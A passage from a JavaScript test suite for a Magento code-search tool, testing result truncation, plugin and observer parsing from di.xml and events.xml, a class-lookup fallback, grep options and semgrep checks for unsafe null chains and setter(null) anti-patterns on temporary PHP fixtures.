  assert(parsed.results[1].snippet !== undefined, 'truncation: rank 2 has snippet');
  assert(parsed.results[2].snippet !== undefined, 'truncation: rank 3 has snippet');

  // Rank 4+ should NOT have snippets
  assertEq(parsed.results[3].snippet, undefined, 'truncation: rank 4 has no snippet');
  assertEq(parsed.results[4].snippet, undefined, 'truncation: rank 5 has no snippet');

  // All results should still have path and className
  for (let i = 0; i < 5; i++) {
    assert(parsed.results[i].path !== undefined, `truncation: rank ${i + 1} has path`);
    assert(parsed.results[i].className !== undefined, `truncation: rank ${i + 1} has className`);
  }

  // fullMethodBody should always be included regardless of rank
  const resultsWithBody = Array.from({ length: 5 }, (_, i) => ({
    path: `vendor/test${i}.php`,
    score: 0.9 - i * 0.1,
    fullMethodBody: `public function test${i}() { return ${i}; }`,
  }));
  const parsedBody = JSON.parse(formatSearchResults(resultsWithBody));
  for (let i = 0; i < 5; i++) {
    assert(parsedBody.results[i].codePreview !== undefined,
      `truncation: rank ${i + 1} keeps fullMethodBody codePreview`);
  }
}

// ─── Plugin Method Bodies in find_plugin ────────────────────────

async function testPluginMethodBodies() {
  console.log('\n── Plugin method bodies ──');

  const tmpDir = path.join(__dirname, 'tmp_plugin_bodies');
  mkdirSync(tmpDir, { recursive: true });
  const pluginFile = path.join(tmpDir, 'ViewPlugin.php');
  writeFileSync(pluginFile, [
    '<?php',
    'namespace Acme\\OrderEdit\\Plugin;',
    '',
    'class ViewPlugin',
    '{',
    '    public function afterAddButton($subject, $result, $buttonId)',
    '    {',
    '        if ($buttonId === "order_edit") {',
    '            $subject->removeButton($buttonId);',
    '        }',
    '        return $result;',
    '    }',
    '',
    '    public function beforeAddButton($subject, $buttonId)',
    '    {',
    '        return [$buttonId];',
    '    }',
    '}'
  ].join('\n'));

  // Replicate extractPluginMethods
  function extractPluginMethods(filePath) {
    let content;
    try { content = readFileSync(filePath, 'utf-8'); } catch { return []; }
    const methods = [];
    const methodRegex = /^\s*public\s+function\s+((?:before|after|around)([A-Z]\w*))\s*\(([^)]*)\)/gm;
    let match;
    while ((match = methodRegex.exec(content)) !== null) {
      const name = match[1];
      const targetMethod = match[2].charAt(0).toLowerCase() + match[2].slice(1);
      let type = 'around';
      if (name.startsWith('before')) type = 'before';
      else if (name.startsWith('after')) type = 'after';
      methods.push({ name, type, targetMethod, signature: match[0].trim() });
    }
    return methods;
  }

  // Replicate readFullMethodBody
  function readFullMethodBody(filePath, methodName, maxLines = 60) {
    let content;
    try { content = readFileSync(filePath, 'utf-8'); } catch { return null; }
    const lines = content.split('\n');
    for (let i = 0; i < lines.length; i++) {
      if (lines[i].includes('function ' + methodName + '(')) {
        let braceCount = 0;
        let started = false;
        for (let j = i; j < lines.length && j < i + maxLines; j++) {
          for (const ch of lines[j]) {
            if (ch === '{') { braceCount++; started = true; }
            if (ch === '}') braceCount--;
          }
          if (started && braceCount <= 0) {
            return lines.slice(i, j + 1).join('\n');
          }
        }
        return lines.slice(i, Math.min(i + maxLines, lines.length)).join('\n');
      }
    }
    return null;
  }

  const methods = extractPluginMethods(pluginFile);
  assertEq(methods.length, 2, 'plugin bodies: finds 2 plugin methods');

  // Simulate what find_plugin does: read body for each method
  for (const m of methods) {
    const body = readFullMethodBody(pluginFile, m.name);
    if (body) m.body = body;
  }

  assert(methods[0].body !== undefined, 'plugin bodies: afterAddButton has body');
  assert(methods[0].body.includes('removeButton'), 'plugin bodies: afterAddButton body contains removeButton');
  assert(methods[1].body !== undefined, 'plugin bodies: beforeAddButton has body');

  rmSync(tmpDir, { recursive: true, force: true });
}

// ─── DI XML Session Cache Tests ─────────────────────────────────

async function testDiXmlSessionCache() {
  console.log('\n── DI XML session cache ──');

  const { glob: globFn } = await import('glob');
  const tmpDir = path.join(__dirname, 'tmp_di_cache');
  const etcDir = path.join(tmpDir, 'vendor', 'acme', 'module-test', 'etc');
  mkdirSync(etcDir, { recursive: true });
  writeFileSync(path.join(etcDir, 'di.xml'), [
    '<?xml version="1.0"?>',
    '<config xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">',
    '    <type name="Acme\\Test\\Model\\Service">',
    '        <plugin name="testPlugin" type="Acme\\Test\\Plugin\\ServicePlugin"/>',
    '    </type>',
    '</config>'
  ].join('\n'));

  // Simulate getDiXmlFiles with cache
  const cache = { files: new Map(), paths: null, root: null };

  async function getDiXmlFiles(root) {
    if (cache.root !== root || !cache.paths) {
      cache.root = root;
      cache.paths = await globFn('**/etc/**/di.xml', { cwd: root, absolute: true, nodir: true });
      cache.files.clear();
    }
    const results = [];
    for (const absPath of cache.paths) {
      let content = cache.files.get(absPath);
      if (content === undefined) {
        try { content = readFileSync(absPath, 'utf-8'); } catch { content = null; }
        cache.files.set(absPath, content);
      }
      if (content !== null) {
        results.push({ absPath, relPath: absPath.replace(root + '/', ''), content });
      }
    }
    return results;
  }

  // First call populates cache
  const files1 = await getDiXmlFiles(tmpDir);
  assertEq(files1.length, 1, 'cache: first call finds 1 di.xml');
  assert(files1[0].content.includes('testPlugin'), 'cache: content contains testPlugin');

  // Second call uses cache (same root)
  const files2 = await getDiXmlFiles(tmpDir);
  assertEq(files2.length, 1, 'cache: second call returns cached result');
  assertEq(cache.files.size, 1, 'cache: file map has 1 entry');

  // Different root invalidates cache
  const tmpDir2 = path.join(__dirname, 'tmp_di_cache2');
  mkdirSync(tmpDir2, { recursive: true });
  const files3 = await getDiXmlFiles(tmpDir2);
  assertEq(files3.length, 0, 'cache: different root returns 0 files');
  assertEq(cache.root, tmpDir2, 'cache: root updated to new dir');

  rmSync(tmpDir, { recursive: true, force: true });
  rmSync(tmpDir2, { recursive: true, force: true });
}

// ─── find_plugin partial match Tests ─────────────────────────────

async function testFindPluginPartialMatch() {
  console.log('\n── find_plugin partial class name matching ──');

  const tmpDir = path.join(__dirname, 'tmp_plugin_partial');
  const etcDir = path.join(tmpDir, 'vendor', 'acme', 'module-salesrule', 'etc');
  mkdirSync(etcDir, { recursive: true });
  writeFileSync(path.join(etcDir, 'di.xml'), [
    '<?xml version="1.0"?>',
    '<config xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">',
    '    <type name="Acme\\SalesRule\\Model\\Rule\\Condition\\Address">',
    '        <plugin name="addressConditions" type="Acme\\Marketplace\\Plugin\\Condition\\AddressConditions"/>',
    '    </type>',
    '</config>'
  ].join('\n'));

  const { glob: globFn } = await import('glob');

  // Simulate the partial matching logic from magento_find_plugin
  function findPluginRegistrations(diFiles, targetClass) {
    const normalizedTarget = targetClass.replace(/\\\\/g, '\\');
    const isFqcn = normalizedTarget.includes('\\');
    const shortTarget = normalizedTarget.split('\\').pop().toLowerCase();
    const registrations = [];

    for (const { content, relPath } of diFiles) {
      if (!content.includes(isFqcn ? normalizedTarget : targetClass)) continue;
      const typeBlockRegex = /<type\s+name="([^"]+)"[^>]*>([\s\S]*?)<\/type>/g;
      let tm;
      while ((tm = typeBlockRegex.exec(content)) !== null) {
        const typeName = tm[1].replace(/\\\\/g, '\\');
        const typeMatches = isFqcn
          ? typeName === normalizedTarget
          : typeName.split('\\').pop().toLowerCase() === shortTarget;
        if (!typeMatches) continue;
        const block = tm[2];
        const pluginRegex = /<plugin\s+([^/>]*)\/?>/g;
        let pm;
        while ((pm = pluginRegex.exec(block)) !== null) {
          const attrs = {};
          const localAttrRe = /(\w+)="([^"]*)"/g;
          let am;
          while ((am = localAttrRe.exec(pm[1])) !== null) {
            attrs[am[1]] = am[2];
          }
          registrations.push({
            target: typeName,
            pluginName: attrs.name || '',
            pluginClass: attrs.type || '',
            file: relPath
          });
        }
      }
    }
    return registrations;
  }

  // Read di.xml files
  const diPaths = await globFn('**/etc/**/di.xml', { cwd: tmpDir, absolute: true, nodir: true });
  const diFiles = diPaths.map(p => ({
    absPath: p,
    relPath: p.replace(tmpDir + '/', ''),
    content: readFileSync(p, 'utf-8')
  }));

  // Test 1: Short name "Address" should find the plugin
  const shortResults = findPluginRegistrations(diFiles, 'Address');
  assertEq(shortResults.length, 1, 'partial match: short "Address" finds 1 plugin');
  assertEq(shortResults[0].pluginName, 'addressConditions', 'partial match: correct plugin name');

  // Test 2: FQCN should also work
  const fqcnResults = findPluginRegistrations(diFiles, 'Acme\\SalesRule\\Model\\Rule\\Condition\\Address');
  assertEq(fqcnResults.length, 1, 'partial match: FQCN finds 1 plugin');

  // Test 3: Wrong short name should find nothing
  const wrongResults = findPluginRegistrations(diFiles, 'Customer');
  assertEq(wrongResults.length, 0, 'partial match: wrong name finds 0 plugins');

  rmSync(tmpDir, { recursive: true, force: true });
}

// ─── find_observer events.xml parsing Tests ─────────────────────

async function testFindObserverEventsXml() {
  console.log('\n── find_observer events.xml parsing ──');

  const tmpDir = path.join(__dirname, 'tmp_observer_events');
  const etcDir = path.join(tmpDir, 'vendor', 'acme', 'module-discount', 'etc');
  mkdirSync(etcDir, { recursive: true });
  writeFileSync(path.join(etcDir, 'events.xml'), [
    '<?xml version="1.0"?>',
    '<config xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">',
    '    <event name="acme_discount_rule_validation_before">',
    '        <observer name="discount_validator" instance="Acme\\Discount\\Observer\\ValidateDiscount" method="execute"/>',
    '    </event>',
    '    <event name="acme_other_event">',
    '        <observer name="other_handler" instance="Acme\\Other\\Observer\\Handler"/>',
    '    </event>',
    '</config>'
  ].join('\n'));

  const { glob: globFn } = await import('glob');

  // Replicate traceEventFlow observer parsing
  async function parseObserversFromEventsXml(root, eventName) {
    const observers = [];
    const eventsFiles = await globFn('**/etc/**/events.xml', { cwd: root, absolute: true, nodir: true });
    const escapedEvent = eventName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

    for (const file of eventsFiles) {
      let content;
      try { content = readFileSync(file, 'utf-8'); } catch { continue; }
      const relativePath = file.replace(root + '/', '');

      const eventBlockRegex = new RegExp(
        '<event\\s+name="' + escapedEvent + '"[^>]*>([\\s\\S]*?)<\\/event>', 'g'
      );
      let eventMatch;
      while ((eventMatch = eventBlockRegex.exec(content)) !== null) {
        const block = eventMatch[1];
        const obsRegex = /<observer\s+[^>]*name="([^"]+)"[^>]*instance="([^"]+)"[^>]*(?:method="([^"]+)")?[^>]*\/?>/g;
        let obsMatch;
        while ((obsMatch = obsRegex.exec(block)) !== null) {
          observers.push({
            name: obsMatch[1],
            instance: obsMatch[2],
            method: obsMatch[3] || 'execute',
            file: relativePath
          });
        }
      }
    }
    return observers;
  }

  // Test 1: Exact event name finds correct observer
  const observers = await parseObserversFromEventsXml(tmpDir, 'acme_discount_rule_validation_before');
  assertEq(observers.length, 1, 'events.xml: finds 1 observer for exact event');
  assertEq(observers[0].name, 'discount_validator', 'events.xml: correct observer name');
  assertEq(observers[0].instance, 'Acme\\Discount\\Observer\\ValidateDiscount', 'events.xml: correct instance');
  assertEq(observers[0].method, 'execute', 'events.xml: correct method');

  // Test 2: Different event finds different observer
  const other = await parseObserversFromEventsXml(tmpDir, 'acme_other_event');
  assertEq(other.length, 1, 'events.xml: finds 1 observer for other event');
  assertEq(other[0].name, 'other_handler', 'events.xml: correct other handler name');
  assertEq(other[0].method, 'execute', 'events.xml: default method is execute');

  // Test 3: Non-existent event finds nothing
  const none = await parseObserversFromEventsXml(tmpDir, 'nonexistent_event');
  assertEq(none.length, 0, 'events.xml: nonexistent event returns 0');

  rmSync(tmpDir, { recursive: true, force: true });
}

// ─── Serve PID Version Tests ────────────────────────────────────

function testServePidVersion() {
  console.log('\n── Serve PID version tracking ──');

  const tmpPidFile = path.join(__dirname, 'tmp_serve.pid');

  // Write PID + version format
  writeFileSync(tmpPidFile, '12345\n2.6.0');
  const content = readFileSync(tmpPidFile, 'utf-8').trim();
  const lines = content.split('\n');
  assertEq(lines[0], '12345', 'pid version: PID line correct');
  assertEq(lines[1], '2.6.0', 'pid version: version line correct');

  // Old format (PID only) should return null for version
  writeFileSync(tmpPidFile, '12345');
  const content2 = readFileSync(tmpPidFile, 'utf-8').trim();
  const lines2 = content2.split('\n');
  assertEq(lines2[1] || null, null, 'pid version: old format returns null version');

  try { unlinkSync(tmpPidFile); } catch {}
}

// ─── find_class Filesystem Fallback Tests ───────────────────────

async function testFindClassFilesystemFallback() {
  console.log('\n── find_class filesystem fallback ──');

  const tmpDir = path.join(__dirname, 'tmp_find_class');
  const phpDir = path.join(tmpDir, 'vendor', 'acme', 'module-order', 'Plugin', 'Condition');
  mkdirSync(phpDir, { recursive: true });
  writeFileSync(path.join(phpDir, 'AddressConditions.php'), [
    '<?php',
    'namespace Acme\\Order\\Plugin\\Condition;',
    '',
    'class AddressConditions',
    '{',
    '    public function beforeValidate($subject, $model)',
    '    {',
    '        return [$model];',
    '    }',
    '}'
  ].join('\n'));

  const { glob: globFn } = await import('glob');

  // Simulate filesystem fallback: vector search returns nothing, so glob for ClassName.php
  async function findClassFallback(root, className) {
    const shortName = className.split('\\').pop();
    const files = await globFn(`**/${shortName}.php`, { cwd: root, absolute: false, nodir: true });
    const results = [];
    for (const f of files.slice(0, 10)) {
      const absPath = path.join(root, f);
      let cn = shortName;
      try {
        const content = readFileSync(absPath, 'utf-8');
        const nsMatch = content.match(/namespace\s+([\w\\]+)/);
        if (nsMatch) cn = nsMatch[1] + '\\' + shortName;
        const methods = [];
        const methodRegex = /public\s+function\s+(\w+)\s*\(/g;
        let mm;
        while ((mm = methodRegex.exec(content)) !== null) methods.push(mm[1]);
        results.push({ path: f, className: cn, methods });
      } catch {
        results.push({ path: f, className: cn });
      }
    }
    return results;
  }

  // Test: find class that vector search would miss
  const results = await findClassFallback(tmpDir, 'AddressConditions');
  assertEq(results.length, 1, 'fs fallback: finds AddressConditions.php');
  assertEq(results[0].className, 'Acme\\Order\\Plugin\\Condition\\AddressConditions',
    'fs fallback: resolves FQCN from namespace');
  assert(results[0].methods.includes('beforeValidate'),
    'fs fallback: extracts public methods');

  // Non-existent class returns empty
  const empty = await findClassFallback(tmpDir, 'NonExistentClass');
  assertEq(empty.length, 0, 'fs fallback: non-existent class returns empty');

  rmSync(tmpDir, { recursive: true, force: true });
}

// ─── Module Structure CamelCase Hyphenation Tests ───────────────

async function testModuleStructureCamelCase() {
  console.log('\n── module_structure camelCase hyphenation ──');

  // Test the hyphenation logic
  function hyphenateCamelCase(str) {
    return str.replace(/([a-z])([A-Z])/g, '$1-$2').toLowerCase();
  }

  assertEq(hyphenateCamelCase('OrderSplit'), 'order-split', 'hyphenate: OrderSplit → order-split');
  assertEq(hyphenateCamelCase('Catalog'), 'catalog', 'hyphenate: Catalog → catalog');
  assertEq(hyphenateCamelCase('PaymentRestrictions'), 'payment-restrictions', 'hyphenate: PaymentRestrictions → payment-restrictions');
  assertEq(hyphenateCamelCase('SalesRule'), 'sales-rule', 'hyphenate: SalesRule → sales-rule');
  assertEq(hyphenateCamelCase('OrderEdit'), 'order-edit', 'hyphenate: OrderEdit → order-edit');

  // Test that vendor path is built correctly
  const moduleName = 'AcmeMarketplace_OrderSplit';
  const parts = moduleName.split('_');
  const vendorPath = parts.length === 2
    ? `module-${parts[1].replace(/([a-z])([A-Z])/g, '$1-$2').toLowerCase()}/`
    : '';
  assertEq(vendorPath, 'module-order-split/', 'module path: AcmeMarketplace_OrderSplit → module-order-split/');
}

// ─── CLI Version Tests ──────────────────────────────────────────

function testCliVersion() {
  console.log('\n── CLI --version ──');

  // Verify package.json is readable and has a version
  const pkgPath = path.resolve(__dirname, '..', 'package.json');
  const pkg = JSON.parse(readFileSync(pkgPath, 'utf-8'));
  assert(typeof pkg.version === 'string', 'cli version: package.json has version string');
  assert(/^\d+\.\d+\.\d+/.test(pkg.version), 'cli version: version matches semver pattern');
}

// ─── magento_grep Tests ─────────────────────────────────────────

async function testMagentoGrep() {
  console.log('\n── magento_grep ──');

  const { execFileSync } = await import('child_process');
  const tmpDir = path.join(__dirname, 'tmp_grep_test');
  mkdirSync(path.join(tmpDir, 'vendor', 'acme', 'module-sales', 'Model'), { recursive: true });
  mkdirSync(path.join(tmpDir, 'vendor', 'acme', 'module-checkout', 'Observer'), { recursive: true });

  writeFileSync(path.join(tmpDir, 'vendor/acme/module-sales/Model/OrderService.php'), [
    '<?php',
    'namespace Acme\\Sales\\Model;',
    'class OrderService {',
    '    public function process($order) {',
    '        $method = $order->getPayment()->getMethod();',
    '        return $method;',
    '    }',
    '}'
  ].join('\n'));

  writeFileSync(path.join(tmpDir, 'vendor/acme/module-checkout/Observer/SaveObserver.php'), [
    '<?php',
    'namespace Acme\\Checkout\\Observer;',
    'class SaveObserver {',
    '    public function execute($observer) {',
    '        $order = $observer->getOrder();',
    '        $payment = $order->getPayment();',
    '        if ($payment !== null) {',
    '            $method = $payment->getMethod();',
    '        }',
    '    }',
    '}'
  ].join('\n'));

  // Test 1: grep for exact pattern finds all matches
  let output;
  try {
    output = execFileSync('grep', ['-rn', '--include=*.php', '--', 'getPayment()', '.'],
      { cwd: tmpDir, encoding: 'utf-8', stdio: ['pipe', 'pipe', 'pipe'] });
  } catch (err) { output = err.stdout || ''; }
  const lines = output.trim().split('\n').filter(Boolean);
  assert(lines.length >= 2, 'grep: finds getPayment() in both files');

  // Test 2: grep with path filter narrows results
  let filtered;
  try {
    filtered = execFileSync('grep', ['-rn', '--include=*.php', '--', 'getPayment()->getMethod()', 'vendor/acme/module-sales/'],
      { cwd: tmpDir, encoding: 'utf-8', stdio: ['pipe', 'pipe', 'pipe'] });
  } catch (err) { filtered = err.stdout || ''; }
  const filteredLines = filtered.trim().split('\n').filter(Boolean);
  assertEq(filteredLines.length, 1, 'grep: path filter narrows to 1 match');
  assert(filteredLines[0].includes('OrderService.php'), 'grep: found in OrderService.php');

  // Test 3: no matches returns empty
  let empty;
  try {
    empty = execFileSync('grep', ['-rn', '--include=*.php', '--', 'nonExistentPattern12345', '.'],
      { cwd: tmpDir, encoding: 'utf-8', stdio: ['pipe', 'pipe', 'pipe'] });
  } catch (err) { empty = err.stdout || ''; }
  assertEq(empty.trim(), '', 'grep: no matches returns empty');

  rmSync(tmpDir, { recursive: true, force: true });
}

// ─── magento_read Tests ─────────────────────────────────────────

async function testMagentoRead() {
  console.log('\n── magento_read ──');

  const tmpDir = path.join(__dirname, 'tmp_read_test');
  mkdirSync(path.join(tmpDir, 'vendor', 'acme', 'module-test', 'Model'), { recursive: true });
  const testFile = path.join(tmpDir, 'vendor/acme/module-test/Model/Service.php');
  writeFileSync(testFile, [
    '<?php',
    'namespace Acme\\Test\\Model;',
    '',
    'class Service',
    '{',
    '    public function execute()',
    '    {',
    '        return true;',
    '    }',
    '',
    '    public function validate()',
    '    {',
    '        return false;',
    '    }',
    '}'
  ].join('\n'));

  // Test 1: read entire file
  const content = readFileSync(testFile, 'utf-8');
  const allLines = content.split('\n');
  assertEq(allLines.length, 15, 'read: file has 15 lines');

  // Test 2: line range extraction
  const start = 5;
  const end = 9;
  const sliced = allLines.slice(start - 1, end);
  assertEq(sliced.length, 5, 'read: line range 5-9 returns 5 lines');
  assert(sliced[0].includes('{') || sliced[0].includes('class'), 'read: line 5 is part of class block');

  // Test 3: numbered output format
  const numbered = sliced.map((line, i) => `${start + i}\t${line}`).join('\n');
  assert(numbered.includes('5\t'), 'read: numbered output starts with line 5');

  rmSync(tmpDir, { recursive: true, force: true });
}

// ─── Grep Default Context Tests ─────────────────────────────────

function testGrepDefaultContext() {
  console.log('\n── grep default context ──');

  // Default context is now 4 (increased from 2 for better null-guard visibility)
  const defaultCtx = undefined; // simulates args.context not provided
  const ctxLines = defaultCtx !== undefined ? defaultCtx : 4;
  assertEq(ctxLines, 4, 'grep default: context defaults to 4 when not provided');

  // Verify explicit 0 is respected (useful for broad scans)
  const explicitZero = 0;
  const ctxZero = explicitZero !== undefined ? explicitZero : 4;
  assertEq(ctxZero, 0, 'grep default: explicit 0 is respected');

  // Verify explicit value is respected
  const explicit5 = 5;
  const ctx5 = explicit5 !== undefined ? explicit5 : 4;
  assertEq(ctx5, 5, 'grep default: explicit 5 is respected');
}

// ─── grep filesOnly Tests ────────────────────────────────────────

async function testGrepFilesOnly() {
  console.log('\n── grep filesOnly ──');

  const { execFileSync } = await import('child_process');
  const tmpDir = path.join(__dirname, 'tmp_filesonly_test');
  mkdirSync(path.join(tmpDir, 'vendor', 'acme', 'module-a', 'Model'), { recursive: true });
  mkdirSync(path.join(tmpDir, 'vendor', 'acme', 'module-b', 'Model'), { recursive: true });

  writeFileSync(path.join(tmpDir, 'vendor/acme/module-a/Model/Foo.php'),
    '<?php\nclass Foo { public function bar() { return $this->baz->getMethod(); } }');
  writeFileSync(path.join(tmpDir, 'vendor/acme/module-b/Model/Bar.php'),
    '<?php\nclass Bar { public function run() { return $this->svc->getMethod(); } }');
  writeFileSync(path.join(tmpDir, 'vendor/acme/module-b/Model/Baz.php'),
    '<?php\nclass Baz { public function nope() { return 42; } }');

  // filesOnly (-rl) returns only file paths, not content
  let filesOutput;
  try {
    filesOutput = execFileSync('grep', ['-rl', '--include=*.php', '--', 'getMethod()', '.'],
      { cwd: tmpDir, encoding: 'utf-8', stdio: ['pipe', 'pipe', 'pipe'] });
  } catch (err) { filesOutput = err.stdout || ''; }
  const matchedFiles = filesOutput.trim().split('\n').filter(Boolean);
  assertEq(matchedFiles.length, 2, 'filesOnly: returns 2 files with getMethod()');
  assert(matchedFiles.every(f => f.endsWith('.php')), 'filesOnly: each result is a file path');
  assert(!matchedFiles.some(f => f.includes('Baz.php')), 'filesOnly: non-matching file excluded');

  // filesOnly output has no line numbers or content
  assert(!filesOutput.includes('getMethod'), 'filesOnly: output contains no code content');

  rmSync(tmpDir, { recursive: true, force: true });
}

// ─── magento_ast_search Tests ────────────────────────────────────

async function testAstSearch() {
  console.log('\n── magento_ast_search (semgrep) ──');

  const { execFileSync } = await import('child_process');
  // Use /tmp to avoid being inside the magector git repo (semgrep uses git root for .semgrepignore lookup)
  const tmpDir = '/tmp/magector_ast_test_' + Date.now();
  mkdirSync(path.join(tmpDir, 'vendor', 'acme', 'module-test'), { recursive: true });
  // Empty .semgrepignore overrides semgrep's default ignore list (which includes vendor/)
  writeFileSync(path.join(tmpDir, '.semgrepignore'), '# Magector test: scan all\n');

  // File with unsafe chain (no null guard)
  writeFileSync(path.join(tmpDir, 'vendor/acme/module-test/Unsafe.php'), [
    '<?php',
    'class Unsafe {',
    '    public function execute($order) {',
    '        $method = $order->getPayment()->getMethod();',
    '        return $method;',
    '    }',
    '}'
  ].join('\n'));

  // File with safe chain (null guard present)
  writeFileSync(path.join(tmpDir, 'vendor/acme/module-test/Safe.php'), [
    '<?php',
    'class Safe {',
    '    public function execute($order) {',
    '        $payment = $order->getPayment();',
    '        if ($payment !== null) {',
    '            return $payment->getMethod();',
    '        }',
    '        return null;',
    '    }',
    '}'
  ].join('\n'));

  // semgrep should find the unsafe chain pattern in both-method-chain case
  let semgrepOut;
  try {
    semgrepOut = execFileSync('semgrep', [
      '--pattern', '$X->getPayment()->$Y(...)',
      '--lang', 'php',
      '--json',
      '--no-git-ignore',
      tmpDir
    ], { encoding: 'utf-8', timeout: 30000, maxBuffer: 5 * 1024 * 1024, stdio: ['pipe', 'pipe', 'pipe'],
         env: { ...process.env, PATH: process.env.PATH + ':/home/swed/.local/bin' } });
  } catch (err) { semgrepOut = err.stdout || ''; }

  let parsed;
  try { parsed = JSON.parse(semgrepOut); } catch { parsed = { results: [] }; }

  assert(parsed.results !== undefined, 'ast_search: semgrep returns results array');
  assert(parsed.results.length >= 1, 'ast_search: finds at least 1 match for ->getPayment()->$Y(...)');
  assert(parsed.results.some(r => r.path.includes('Unsafe.php')), 'ast_search: match found in Unsafe.php');
  // The safe version splits the chain, so it may or may not match depending on semgrep version
  assert(parsed.results.every(r => r.start && r.end), 'ast_search: each result has location info');

  rmSync(tmpDir, { recursive: true, force: true });
}

// ─── magento_find_dataobject_issues Tests ────────────────────────

async function testFindDataObjectIssues() {
  console.log('\n── magento_find_dataobject_issues (DataObject set-null anti-pattern) ──');

  const { execFileSync } = await import('child_process');
  // Use /tmp to avoid being inside the magector git repo (.semgrepignore lookup)
  const tmpDir = '/tmp/magector_dataobj_test_' + Date.now();
  mkdirSync(path.join(tmpDir, 'vendor', 'acme', 'module-quote'), { recursive: true });
  writeFileSync(path.join(tmpDir, '.semgrepignore'), '# Magector test: scan all\n');

  // File with DataObject anti-pattern: setX(null) calls
  writeFileSync(path.join(tmpDir, 'vendor/acme/module-quote/Address.php'), [
    '<?php',
    'class Address extends \\Magento\\Framework\\DataObject {',
    '    public function resetDiscount() {',
    '        $this->setCouponCode(null);',   // ← anti-pattern
    '        $this->setDiscountAmount(null);', // ← anti-pattern
    '    }',
    '    public function clearActive() {',
    '        $this->setActive(false);',       // ← NOT null — should NOT be detected
    '        $this->unsetData(\'coupon_code\');', // ← correct — should NOT be detected
    '    }',
    '}'
  ].join('\n'));

  // File without anti-pattern (null passed to non-setter method)
  writeFileSync(path.join(tmpDir, 'vendor/acme/module-quote/Safe.php'), [
    '<?php',
    'class Safe {',
    '    public function process($order) {',
    '        $order->getPayment()->setMethod(null);', // ← anti-pattern: setMethod(null)
    '        $order->process(null);',                  // ← NOT setter — should NOT be detected
    '    }',
    '}'
  ].join('\n'));

  // Run semgrep directly with broad pattern, then filter
  let semgrepOut;
  try {
    semgrepOut = execFileSync('semgrep', [
      '--pattern', '$X->$SETTER(null)',
      '--lang', 'php',
      '--json',
      '--no-git-ignore',
      tmpDir
    ], { encoding: 'utf-8', timeout: 30000, maxBuffer: 5 * 1024 * 1024, stdio: ['pipe', 'pipe', 'pipe'],
         env: { ...process.env, PATH: process.env.PATH + ':/home/swed/.local/bin' } });
  } catch (err) { semgrepOut = err.stdout || ''; }

  let parsed;
  try { parsed = JSON.parse(semgrepOut); } catch { parsed = { results: [] }; }

  // semgrep >=1.100 may return "requires login" in extra.lines — fall back to extra.message
  const getSnippet = r => {
    const lines = r.extra?.lines || '';
    return (lines && lines !== 'requires login') ? lines : (r.extra?.message || '');
  };

  // Post-filter: only ->setX(null) where X starts with uppercase (DataObject setter pattern)
  const setterNullRegex = /->set[A-Z]\w+\s*\(\s*null\s*\)/;
  const filtered = (parsed.results || []).filter(r => setterNullRegex.test(getSnippet(r)));

  assert(parsed.results !== undefined, 'find_dataobject_issues: semgrep returns results array');
  // Should find setCouponCode(null), setDiscountAmount(null), setMethod(null) — 3 hits
  assert(filtered.length >= 2, `find_dataobject_issues: finds at least 2 setX(null) calls, got ${filtered.length}`);
  // Should find hits in Address.php
  assert(filtered.some(r => r.path.includes('Address.php')), 'find_dataobject_issues: match found in Address.php');
  // process(null) should NOT be in filtered results
  assert(!filtered.some(r => getSnippet(r).includes('->process(null)')), 'find_dataobject_issues: process(null) not included (not a setter)');
  // setActive(false) should NOT be in filtered results (not null)
  assert(!filtered.some(r => getSnippet(r).includes('setActive(false)')), 'find_dataobject_issues: setActive(false) not included (not null)');

  rmSync(tmpDir, { recursive: true, force: true });
}

// ─── magento_read methodName hint Tests ─────────────────────────

async function testReadMethodNameHint() {
  console.log('\n── magento_read methodName hint ──');

  const tmpDir = path.join(__dirname, 'tmp_read_hint_test');
  mkdirSync(path.join(tmpDir, 'vendor', 'acme'), { recursive: true });

  // Build a file with > 100 lines
  const methods = [];
  for (let i = 0; i < 5; i++) {
    methods.push(`    public function method${i}()\n    {\n        return ${i};\n    }`);
  }
  const bigFile = ['<?php', 'namespace Acme\\Test;', 'class BigService', '{', ...methods, '}'].join('\n');
  // Pad to > 100 lines
  const padded = bigFile + '\n' + '// padding\n'.repeat(90);
  const filePath = path.join(tmpDir, 'vendor/acme/BigService.php');
  writeFileSync(filePath, padded);

  const content = readFileSync(filePath, 'utf-8');
  const lines = content.split('\n');
  assert(lines.length > 100, 'read hint: test file has >100 lines');

  // Simulate hint logic from mcp-server.js
  const methodMatches = content.match(/(?:public|protected|private)\s+(?:static\s+)?function\s+(\w+)/g) || [];
  assert(methodMatches.length >= 5, 'read hint: detects 5 methods');
  const methodNames = methodMatches.slice(0, 8).map(m => m.replace(/.*function\s+/, ''));
  assert(methodNames.includes('method0'), 'read hint: method0 in extracted names');
  assert(methodNames.includes('method4'), 'read hint: method4 in extracted names');

  rmSync(tmpDir, { recursive: true, force: true });
}

// ─── buildTraceSummary Tests ────────────────────────────────────

function testBuildTraceSummary() {
  console.log('\n── buildTraceSummary ──');

  function buildTraceSummary(result) {
    const { entryPoint, entryType, trace } = result;
    const parts = [];
    switch (entryType) {
      case 'route':
        parts.push(`Route ${entryPoint}`);
        if (trace.controller) parts.push(trace.controller.className ? `${trace.controller.className}::execute()` : trace.controller.path);
        break;
      case 'api':
        parts.push(`API ${entryPoint}`);
        if (trace.serviceClass) parts.push(trace.serviceClass.className || trace.serviceClass.path);
        break;
      case 'graphql':
        parts.push(`GraphQL ${entryPoint}`);
        if (trace.resolver) parts.push(trace.resolver.className || trace.resolver.path);
        break;
      case 'event':
        parts.push(`Event ${entryPoint}`);
        break;
      case 'cron':
        parts.push(`Cron ${entryPoint}`);
        if (trace.handler) parts.push(trace.handler.className || trace.handler.path);
        break;
    }
    const counts = [];
    if (trace.plugins?.length) counts.push(`${trace.plugins.length} plugin${trace.plugins.length > 1 ? 's' : ''}`);
    if (trace.observers?.length) counts.push(`${trace.observers.length} observer${trace.observers.length > 1 ? 's' : ''}`);
    if (trace.templates?.length) counts.push(`${trace.templates.length} template${trace.templates.length > 1 ? 's' : ''}`);
    if (trace.layout?.length) counts.push(`${trace.layout.length} layout${trace.layout.length > 1 ? 's' : ''}`);
    if (trace.preferences?.length) counts.push(`${trace.preferences.length} preference${trace.preferences.length > 1 ? 's' : ''}`);
    if (counts.length > 0) parts.push(counts.join(', '));
    return parts.join(' \u2192 ');
  }

  const s1 = buildTraceSummary({
    entryPoint: 'checkout/cart/add', entryType: 'route',
